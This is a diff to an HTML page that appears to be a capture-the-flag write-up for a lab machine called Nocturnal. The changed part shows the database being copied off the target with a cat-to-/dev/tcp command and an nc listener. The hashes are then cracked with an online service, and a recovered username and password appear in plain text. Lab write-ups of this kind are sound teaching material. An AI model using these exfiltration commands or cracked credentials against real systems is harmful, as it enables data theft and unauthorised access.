@@ -168,12 +168,14 @@ function cleanEntry($entry) {
 <h2>Downloading the database</h2>
 <p><img alt="find" src="../images/Nocturnal/find.png" /></p>
 <p>I transferred the database onto my machine and took all of the password hashes inside.</p>
-<div class="codehilite"><pre><span></span><code>cat &lt; /dev/tcp/10.10.16.64/9002 &gt; nocturnal_database.db - on target
+<div class="codehilite"><pre><span></span><code>cat nocturnal_database.db &gt; /dev/tcp/IP/PORT &gt; - on target
 
 nc -lnkvp 9002 &gt; nocturnal_database.db - on host
 </code></pre></div>
 
-<p>There were 3 users. Amanda, admin, and Tobias. Tobias's hash cracked and revealed his password.</p>
+<p><img alt="database" src="../images/Nocturnal/database.png" /></p>
+<p>I'll take the first 3 users, Amanda, admin and Tobias, and I'll try cracking their hashes. Since these are MD5 hashes, I will use crackstation to do that.</p>
+<p><img alt="crack" src="../images/Nocturnal/crack.png" /></p>
 <p><code>tobias | slowmotionapocalypse</code></p>
 <p>I will try to SSH into the machine with these credentials.</p>
 <p><img alt="user" src="../images/Nocturnal/user.png" /></p>
